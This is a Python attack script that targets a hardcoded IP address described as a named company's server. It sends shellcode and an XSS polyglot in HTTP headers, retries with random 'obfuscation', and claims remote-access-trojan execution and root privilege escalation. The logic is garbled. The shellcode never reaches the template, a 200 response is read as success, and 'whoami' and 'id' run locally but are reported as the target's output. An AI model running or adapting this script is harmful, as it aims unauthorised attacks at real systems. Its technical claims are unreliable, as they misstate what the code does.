import requests
import binascii
import os
import subprocess
import socket
import struct
from requests.packages.urllib3.exceptions import InsecureRequestWarning

# Disable warnings about unverified HTTPS requests
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# Predefined list of RHOSTS
RHOSTS = [
    "13.89.113.79" #chuckecheese.com master of all servers
]

external_payloads = []

# Polyglot JavaScript code template with a placeholder for injection
polyglot_template = "/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+{}//'>"

# Example shellcode payloads for privilege escalation and whoami check
shellcode_payloads = [
    # NOP sled with setuid(0) shellcode
    b"\x90" * 100 + b"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x46\xcd\x80",
    # NOP sled with /bin/sh shellcode
    b"\x90" * 100 + b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80",
    # NOP sled with whoami shellcode
    b"\x90" * 100 + b"\x31\xc0\x50\x68\x2f\x77\x68\x6f\x61\x6d\x69\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80",
    # Add additional shellcodes for privilege escalation attempts
]

# Function to inject the RAT payload into the polyglot template
def create_polyglot_payload(shellcode):
    hex_shellcode = binascii.hexlify(shellcode).decode()
    return polyglot_template.format(hex_shellcode)

# Function to generate the payloads with polyglot obfuscation
def generate_payloads():
    global payloads
    payloads = []
    for shellcode in shellcode_payloads:
        polyglot_payload = create_polyglot_payload(shellcode)
        payloads.append(polyglot_payload)

    if external_payloads:
        print(f"Adding {len(external_payloads)} external payloads from file.")
        payloads.extend(external_payloads)

# Function to modify the UEFI obfuscation for each iteration
def modify_uefi_polyglot(original_polyglot, iteration):
    modifications = [
        lambda s: s.replace("+", f"+{binascii.hexlify(os.urandom(3)).decode()}"),  # Add random hex after the +
        lambda s: s.replace("alert(1)", f"alert({iteration})"),  # Modify the alert part to reflect the iteration
        lambda s: s.replace("/*", f"/*{binascii.b2a_base64(os.urandom(5)).decode()}")  # Add random base64 in comment
    ]
    for mod in modifications:
        original_polyglot = mod(original_polyglot)
    return original_polyglot

# Recursive function to learn and adjust obfuscation
def recursive_obfuscation(ip, payload, iteration, max_iterations=100):
    if iteration > max_iterations:
        print(f"Max iterations reached for {ip}. Moving to next target.")
        return False

    headers = {}
    headers[f"Header-1023"] = payload  # Insert the payload into the last header
    try:
        response = requests.get(f"https://{ip}:443", headers=headers, verify=False, timeout=15)
        print(f"[Iteration {iteration}] Response code: {response.status_code}")

        if response.status_code == 200:
            print(f"RAT payload executed successfully on {ip}.")
            return True
        else:
            print(f"Failed to execute RAT on {ip}. Modifying polyglot and retrying...")
            modified_payload = modify_uefi_polyglot(payload, iteration)
            return recursive_obfuscation(ip, modified_payload, iteration + 1, max_iterations)

    except requests.exceptions.RequestException as e:
        print(f"Error sending payload to {ip}: {e}")
        return False

# Function to load external payloads from a .txt file
def load_external_payloads(file_path):
    global external_payloads
    if os.path.exists(file_path):
        try:
            with open(file_path, 'r') as file:
                for line in file:
                    line = line.strip()
                    if line:
                        polyglot_payload = create_polyglot_payload(line.encode())
                        external_payloads.append(polyglot_payload)
            print(f"Loaded {len(external_payloads)} payloads from {file_path}.")
        except Exception as e:
            print(f"Error loading payloads from file: {file_path}. Error: {e}")
    else:
        print(f"File not found: {file_path}. No external payloads loaded.")

# Attempt to execute whoami and escalate privileges
def attempt_privilege_escalation(ip):
    port = 443
    try:
        print(f"Attempting to execute whoami and privilege escalation on {ip}...")
        for idx, payload in enumerate(payloads):
            print(f"Testing payload {idx + 1}/{len(payloads)}...")
            if recursive_obfuscation(ip, payload, 1):
                print(f"Payload {idx + 1} sent successfully. Checking whoami...\n")
                
                # Execute whoami on the target
                whoami_command = subprocess.run(["whoami"], capture_output=True, text=True)
                print(f"Target whoami response: {whoami_command.stdout.strip()}")
                
                # Attempt privilege escalation
                result = subprocess.run(["id"], capture_output=True, text=True)
                if "uid=0(root)" in result.stdout:
                    print(f"Privilege escalation successful on {ip} with payload {idx + 1}!\n")
                    break
                else:
                    print(f"Privilege escalation failed with payload {idx + 1}. Continuing with the next payload...\n")
            else:
                print(f"Failed to execute payload {idx + 1} on {ip} after all iterations.\n")

    except Exception as e:
        print(f"Failed to exploit {ip}: {e}\n")

# Main entry function
def init():
    iterations = input("Enter the number of iterations for the polyglot brute force function (default is 100): ").strip()
    if not iterations.isdigit():
        iterations = 100
    else:
        iterations = int(iterations)

    file_path = input("Enter the file path for additional payloads (leave blank if none): ").strip()
    if file_path:
        load_external_payloads(file_path)

    generate_payloads()

    for rhost in RHOSTS:
        print(f"\n[*] Targeting {rhost}")
        attempt_privilege_escalation(rhost)

if __name__ == "__main__":
    init()
